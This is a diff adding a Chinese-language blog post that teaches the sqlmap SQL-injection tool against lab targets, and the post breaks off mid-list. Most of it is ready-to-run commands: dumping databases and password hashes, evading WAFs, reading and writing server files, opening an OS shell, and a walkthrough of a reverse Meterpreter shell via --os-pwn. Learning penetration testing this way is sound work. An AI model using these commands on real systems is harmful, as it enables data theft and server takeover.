@@ -1,0 +1,776 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="../../../../../img/fluid.png">
+  <link rel="icon" href="../../../../../img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#447EA5">
+  <meta name="author" content="iDea">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="前言sqlmap是⼀个⾃动化的SQL注⼊⼯具，其主要功能是扫描，发现并利⽤给定的URL进⾏SQL 注⼊。⽬前⽀持的数据库有MySql、Oracle、Access、PostageSQL、SQL Server、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB等 Sqlmap采⽤了以下5种独特的SQL注⼊技术  基于布尔类型的盲注，即可以根据返回⻚⾯判断条件真假的注⼊ 基">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap使用">
+<meta property="og:url" content="http://idea-oss.github.io/2024/01/08/sqlmap%E4%BD%BF%E7%94%A8/sqlmap%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:site_name" content="iDea &#39;blog">
+<meta property="og:description" content="前言sqlmap是⼀个⾃动化的SQL注⼊⼯具，其主要功能是扫描，发现并利⽤给定的URL进⾏SQL 注⼊。⽬前⽀持的数据库有MySql、Oracle、Access、PostageSQL、SQL Server、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB等 Sqlmap采⽤了以下5种独特的SQL注⼊技术  基于布尔类型的盲注，即可以根据返回⻚⾯判断条件真假的注⼊ 基">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://idea-oss.github.io/img/sqlmap%E4%BD%BF%E7%94%A8.png">
+<meta property="article:published_time" content="2024-01-08T01:27:25.000Z">
+<meta property="article:modified_time" content="2024-01-08T02:34:03.381Z">
+<meta property="article:author" content="iDea">
+<meta property="article:tag" content="sqlmap">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://idea-oss.github.io/img/sqlmap%E4%BD%BF%E7%94%A8.png">
+  
+  
+  
+  <title>sqlmap使用 - iDea &#39;blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="../../../../../css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="../../../../../css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="../../../../../css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"idea-oss.github.io","root":"/","version":"1.9.1","typing":{"enable":true,"typeSpeed":100,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":"https://0mpxzrpw.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="../../../../../js/utils.js" ></script>
+  <script  src="../../../../../js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 85vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="../../../../../index.html">
+      <strong>iDea</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../../index.html">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../../archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../../categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../../tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="../../../../../about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('../../../../.././img/sqlmap%E4%BD%BF%E7%94%A8.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.5)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="sqlmap使用"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-01-08 09:27" pubdate>
+          2024年1月8日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          8.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          69 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+        <div class="scroll-down-bar">
+          <i class="iconfont icon-arrowdown"></i>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">sqlmap使用</h1>
+            
+            <div class="markdown-body">
+              
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>sqlmap是⼀个⾃动化的SQL注⼊⼯具，其主要功能是扫描，发现并利⽤给定的URL进⾏SQL 注⼊。⽬前⽀持的数据库有MySql、Oracle、Access、PostageSQL、SQL Server、IBM DB2、SQLite、Firebird、Sybase和SAP MaxDB等</p>
+<p>Sqlmap采⽤了以下5种独特的SQL注⼊技术</p>
+<ul>
+<li>基于布尔类型的盲注，即可以根据返回⻚⾯判断条件真假的注⼊</li>
+<li>基于时间的盲注，即不能根据⻚⾯返回的内容判断任何信息，要⽤条件语句查看时间延迟 语句是否已经执⾏(即⻚⾯返回时间是否增加)来判断</li>
+<li>基于报错注⼊，即⻚⾯会返回错误信息，或者把注⼊的语句的结果直接返回到⻚⾯中</li>
+<li>联合查询注⼊，在可以使⽤Union的情况下注⼊</li>
+<li>堆查询注⼊，可以同时执⾏多条语句时的注⼊</li>
+</ul>
+<p>Sqlmap的强⼤的功能包括 数据库指纹识别、数据库枚举、数据提取、访问⽬标⽂件系统，并 在获取完全的操作权限时执⾏任意命令。</p>
+<h2 id="Sqlmap的简单⽤法"><a href="#Sqlmap的简单⽤法" class="headerlink" title="Sqlmap的简单⽤法"></a>Sqlmap的简单⽤法</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r http.txt <span class="hljs-comment">#http.txt是我们抓取的http的请求包</span><br>sqlmap -r http.txt -p username <span class="hljs-comment">#指定参数，当有多个参数⽽你⼜知道username参数</span><br>存在SQL漏洞，你就可以使⽤-p指定参数进⾏探测<br>sqlmap -u <span class="hljs-string">&quot;http://www.xx.com/username/admin*&quot;</span> <span class="hljs-comment">#如果我们已经知道admin这⾥是注⼊点的话，可以在其后⾯加个*来让sqlmap对其注⼊</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> <span class="hljs-comment">#探测该url是否存在漏洞</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --cookie=<span class="hljs-string">&quot;抓取的cookie&quot;</span> <span class="hljs-comment">#当该⽹站需要登录时，探测该url是否存在漏洞</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --data=<span class="hljs-string">&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot;</span> <span class="hljs-comment">#抓取其post提交的数据填⼊</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --<span class="hljs-built_in">users</span> <span class="hljs-comment">#查看数据库的所有⽤户</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --passwords <span class="hljs-comment">#查看数据库⽤户名的密码有时候使⽤ --passwords 不能获取到密码，则可以试下</span><br>-D mysql -T user -C host,user,password --dump 当MySQL&lt; 5.7时<br>-D mysql -T user -C host,user,authentication_string --dump 当MySQL&gt;=<br>5.7时<br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --current-user <span class="hljs-comment">#查看数据库当前的⽤户</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --is-dba <span class="hljs-comment">#判断当前⽤户是否有管理员权限</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --roles <span class="hljs-comment">#列出数据库所有管理员⻆⾊，仅适⽤于oracle数据库的时候</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --dbs <span class="hljs-comment">#爆出所有的数据库</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --tables <span class="hljs-comment">#爆出所有的数据表</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --columns <span class="hljs-comment">#爆出数据库中所有的列</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --current-db <span class="hljs-comment">#查看当前的数据库</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> -D security --tables <span class="hljs-comment">#爆出数据库security中的所有的表</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> -D security -T <span class="hljs-built_in">users</span> --columns <span class="hljs-comment">#爆出security数据库中users表中的所有的列</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> -D security -T <span class="hljs-built_in">users</span> -C username --dump <span class="hljs-comment">#爆出数据库security中的users表中的username列中的所有数据</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> -D security -T <span class="hljs-built_in">users</span> -C username --dump --start 1 --stop 100 <span class="hljs-comment">#爆出数据库security中的users表中的username列中的前100条数据</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> -D security -T <span class="hljs-built_in">users</span> --dump-all <span class="hljs-comment">#爆出数据库security中的users表中的所有数据</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> -D security --dump-all<span class="hljs-comment">#爆出数据库security中的所有数据</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --dump-all <span class="hljs-comment">#爆出该数据库中的所有数据</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --tamper=space2comment.py <span class="hljs-comment">#指定脚本进⾏过滤，⽤/**/代替空格</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --level=5 --risk=3 <span class="hljs-comment">#探测等级5，平台危险等级3，都是最⾼级别。当level=2时，会测试cookie注⼊。当level=3时，会测试user-agent/referer注⼊。</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --sql-shell <span class="hljs-comment">#执⾏指定的sql语句</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --os-shell/--os-cmd<span class="hljs-comment">#执⾏--os-shell命令，获取⽬标服务器权限</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --os-pwn <span class="hljs-comment">#执⾏--ospwn命令，将⽬标权限弹到MSF上</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --file-read<span class="hljs-string">&quot;c:/test.txt&quot;</span> <span class="hljs-comment">#读取⽬标服务器C盘下的test.txt⽂件</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --file-write test.txt --file-dest <span class="hljs-string">&quot;e:/hack.txt&quot;</span> <span class="hljs-comment">#将本地的test.txt⽂件上传到⽬标服务器的E盘下，并且名字为hack.txt</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --dbms=<span class="hljs-string">&quot;MySQL&quot;</span> <span class="hljs-comment">#指定其数据库为mysql其他数据库：Altibase,Apache Derby, CrateDB, Cubrid, Firebird, FrontBase,H2, HSQLDB, IBM DB2, Informix, InterSystems Cache, Mckoi, MicrosoftAccess, Microsoft SQL Server, MimerSQL, MonetDB, MySQL, Oracle,PostgreSQL, Presto, SAP MaxDB, SQLite, Sybase, Vertica, eXtremeDB</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --random-agent <span class="hljs-comment">#使⽤任意的User-Agent爆破</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --proxy=<span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span> <span class="hljs-comment">#指定代理当爆破HTTPS⽹站会出现超时的话，可以使⽤参数 --delay=3 --force-ssl</span><br>sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --technique T <span class="hljs-comment">#指定时间延迟注⼊，这个参数可以指定sqlmap使⽤的探测技术，默认情况下会测试所有的⽅式，当然，我们也可以直接⼿⼯指定。⽀持的探测⽅式如下：</span><br>　　B: Boolean-based blind SQL injection（布尔型注⼊）<br>　　E: Error-based SQL injection（报错型注⼊）<br>　　U: UNION query SQL injection（可联合查询注⼊）<br>　　S: Stacked queries SQL injection（可多语句查询注⼊）<br>　　T: Time-based blind SQL injection（基于时间延迟注⼊）<br>sqlmap -d <span class="hljs-string">&quot;mysql://root:root@192.168.10.130:3306/mysql&quot;</span> --os-shell <span class="hljs-comment">#知道⽹站的账号密码直接连接</span><br>-v3 <span class="hljs-comment">#输出详细度 最⼤值5 会显示请求包和回复包</span><br>--threads 5 <span class="hljs-comment">#指定线程数</span><br>--fresh-queries <span class="hljs-comment">#清除缓存</span><br>探测指定URL是否存在SQL注⼊漏洞<br>对于不⽤登录的⽹站，直接指定其URL<br>在探测⽬标URL是否存在漏洞的过程中，Sqlmap会和我们进⾏交互。<br>⽐如第⼀处交互的地⽅是说这个⽬标系统的数据库好像是Mysql数据库，是否还探测其他类型<br>的数据库。我们选择 n，就不探测其他类型的数据库了，因为我们已经知道⽬标系统是Mysql<br>数据库了。<br>第⼆处交互的地⽅是说 对于剩下的测试，问我们是否想要使⽤扩展提供的级别(1)和⻛险(1)值<br>的“MySQL”的所有测试吗？ 我们选择 y。<br>--flush-session <span class="hljs-comment">#清空会话，重构注⼊</span><br>--batch <span class="hljs-comment">#对所有的交互式的都是默认的</span><br>--random-agent <span class="hljs-comment">#任意的http头</span><br>--tamper base64encode <span class="hljs-comment">#对提交的数据进⾏base64编码</span><br>--referer http://www.baidu.com <span class="hljs-comment">#伪造referer字段</span><br>--keep-alive 保持连接，当出现 [CRITICAL] connection dropped or unknown<br></code></pre></td></tr></table></figure>
+
+<h2 id="Sqlmap的⾼级⽤法"><a href="#Sqlmap的⾼级⽤法" class="headerlink" title="Sqlmap的⾼级⽤法"></a>Sqlmap的⾼级⽤法</h2><p>Sqlmap在默认情况下除了适⽤CHAR()函数防⽌出现单引号，没有对注⼊的数据进⾏修改。我 们可以使⽤—tamper参数对数据进⾏修改来绕过WAF等设备，其中的⼤部分脚本主要⽤正则 模块替换攻击载荷字符编码的⽅式尝试绕过WAF的检测规则。Sqlmap⽬前官⽅提供53个绕过 脚本。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">--identify-waf 检测是否有WAF<br><span class="hljs-comment">#使⽤参数进⾏绕过</span><br>--random-agent 使⽤任意HTTP头进⾏绕过，尤其是在WAF配置不当的时候<br>--time-sec=3 使⽤⻓的延时来避免触发WAF的机制，这⽅式⽐较耗时<br>--hpp 使⽤HTTP 参数污染进⾏绕过，尤其是在ASP.NET/IIS 平台上<br>--proxy=100.100.100.100:8080 --proxy-cred=211:985 使⽤代理进⾏绕过<br>--ignore-proxy 禁⽌使⽤系统的代理，直接连接进⾏注⼊<br>--flush-session 清空会话，重构注⼊<br>--hex 或者 --no-cast 进⾏字符码转换<br>--mobile 对移动端的服务器进⾏注⼊<br>--tor 匿名注⼊<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><h4 id="指定脚本进⾏绕过-—tamper"><a href="#指定脚本进⾏绕过-—tamper" class="headerlink" title="指定脚本进⾏绕过(—tamper)"></a>指定脚本进⾏绕过(—tamper)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap --tamper=space2comment.py <span class="hljs-comment">#⽤/**/代替空格</span><br>sqlmap --tamper=<span class="hljs-string">&quot;space2comment.py,space2plus.py&quot;</span> 指定多个脚本进⾏过滤<br></code></pre></td></tr></table></figure>
+
+<p>在该目录下&#x2F;sqlmap&#x2F;tamper</p>
+<p><img src="/2024/01/08/sqlmap%E4%BD%BF%E7%94%A8/sqlmap%E4%BD%BF%E7%94%A8/image-20240108095010258.png" srcset="/img/loading.gif" lazyload alt="image-20240108095010258"></p>
+</li>
+<li><h4 id="探测等级和危险等级-—level-—risk"><a href="#探测等级和危险等级-—level-—risk" class="headerlink" title="探测等级和危险等级(—level —risk)"></a>探测等级和危险等级(—level —risk)</h4><p>Sqlmap ⼀共有5个探测等级，默认是1。等级越⾼，说明探测时使⽤的payload也越多。其中5 级的payload最多，会⾃动破解出cookie、XFF等头部注⼊。当然，等级越⾼，探测的时间也 越慢。这个参数会影响测试的注⼊点，GET和POST的数据都会进⾏测试，HTTP cookie在 level为2时就会测试，HTTP User-Agent&#x2F;Referer头在level为3时就会测试。在不确定哪个参数 为注⼊点时，为了保证准确性，建议设置level为5</p>
+<p>sqlmap ⼀共有3个危险等级，也就是说你认为这个⽹站存在⼏级的危险等级。和探测等级⼀个 意思，在不确定的情况下，建议设置为3级，—risk&#x3D;3</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --level=5 --risk=3 <span class="hljs-comment">#探测等级5，平台危险等级3，都是最⾼级别</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><h4 id="执⾏指定的SQL语句-—sql-shell"><a href="#执⾏指定的SQL语句-—sql-shell" class="headerlink" title="执⾏指定的SQL语句(—sql-shell)"></a>执⾏指定的SQL语句(—sql-shell)</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-1/?id=1&quot;</span> --sql-shell <span class="hljs-comment">#执⾏指定的sql语句</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/08/sqlmap%E4%BD%BF%E7%94%A8/sqlmap%E4%BD%BF%E7%94%A8/image-20240108095500603.png" srcset="/img/loading.gif" lazyload alt="image-20240108095500603"></p>
+</li>
+<li><h4 id="执⾏操作系统命令-—os-shell"><a href="#执⾏操作系统命令-—os-shell" class="headerlink" title="执⾏操作系统命令(—os-shell)"></a>执⾏操作系统命令(—os-shell)</h4><p>在数据库为MySQL、PostgreSql或者SQL Server时，可以执⾏该选项。 当为MySQL数据库时</p>
+<p>需满⾜下⾯三个条件：</p>
+<ul>
+<li>当前⽤户为 root</li>
+<li>知道⽹站根⽬录的绝对路径</li>
+<li>该数据库的 secure_file_priv 参数值为空(很多数据库的该值为NULL，这也就导致了即使 当前⽤户是root，即使知道了⽹站根⽬的绝对路径，也不能执⾏成功 —os-shell )</li>
+</ul>
+</li>
+<li><h4 id="反弹⼀个MSF的shell-—os-pwn"><a href="#反弹⼀个MSF的shell-—os-pwn" class="headerlink" title="反弹⼀个MSF的shell(—os-pwn)"></a>反弹⼀个MSF的shell(—os-pwn)</h4><p>在数据库为MySQL、PostgreSql或者SQL Server时，可以执⾏该选项。并且需要当前获取的 权限⾜够⾼才可以</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.10.20:88/index.php?id=1&quot;</span> --os-pwn<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">选择连接的tunnel，这⾥选择默认的 1 就可以了<br>[1] TCP: Metasploit Framework (default)<br>[2] ICMP: icmpsh – ICMP tunneling<br>&gt; 1<br>选择⽹站的脚本语⾔，这⾥根据情况选择<br>[1] ASP<br>[2] ASPX<br>[3] JSP<br>[4] PHP (default)<br>&gt; 4<br>选择⽹站的路径，这⾥也是根据情况⽽定，如果知道⽹站路径的话，可以选择2然后⼿动输⼊<br>[1] common location(s) (‘C:/xampp/htdocs/, C:/wamp/www/, C:/Inetpub/wwwroot/‘)<br>(default)<br>[2] custom location(s)<br>[3] custom directory list file<br>[4] brute force search<br>&gt; 2<br>please provide a comma separate list of absolute directory paths: C:\phpstudy\WWW<br><br><br><br>然后选择连接的类型，这⾥选择默认的1 即可<br><span class="hljs-built_in">which</span> connection <span class="hljs-built_in">type</span> <span class="hljs-keyword">do</span> you want to use?<br>[1] Reverse TCP: Connect back from the database host to this machine (default)<br>[2] Reverse TCP: Try to connect back from the database host to this machine, on all ports<br>between the specified and 65535<br>[3] Reverse HTTP: Connect back from the database host to this machine tunnelling traffic<br>over HTTP<br>[4] Reverse HTTPS: Connect back from the database host to this machine tunnelling traffic<br>over HTTPS<br>[5] Bind TCP: Listen on the database host <span class="hljs-keyword">for</span> a connection<br>&gt; 1<br><br><br><span class="hljs-built_in">which</span> payload <span class="hljs-keyword">do</span> you want to use?nt to use? [11563] ‘ (detected)]<br>[1] Meterpreter (default)<br>[2] Shell<br>[3] VNC<br>&gt; 1<br><br>执⾏完成后，如果不出问题，我们就可以获得⼀个MSF类型的shell了<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/08/sqlmap%E4%BD%BF%E7%94%A8/sqlmap%E4%BD%BF%E7%94%A8/image-20240108102954635.png" srcset="/img/loading.gif" lazyload alt="image-20240108102954635"></p>
+</li>
+<li><h4 id="读取服务器⽂件-—file-read"><a href="#读取服务器⽂件-—file-read" class="headerlink" title="读取服务器⽂件(—file-read)"></a>读取服务器⽂件(—file-read)</h4><p>当数据库为MySQL、PostgreSQL或SQL Server，并且当前⽤户有权限时，可以读取指定⽂ 件，可以是⽂本⽂件或者⼆进制⽂件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://192.168.10.1/sqli/Less-4/?id=1&quot;</span> --file-read <span class="hljs-string">&quot;c:/test.txt&quot;</span> <span class="hljs-comment">#读取⽬标服务器C盘下的test.txt⽂件</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到，⽂件读取成功了，并且保存成了 &#x2F;root&#x2F;.sqlmap&#x2F;output&#x2F;192.168.10.1&#x2F;files&#x2F;c__test.txt ⽂件</p>
+</li>
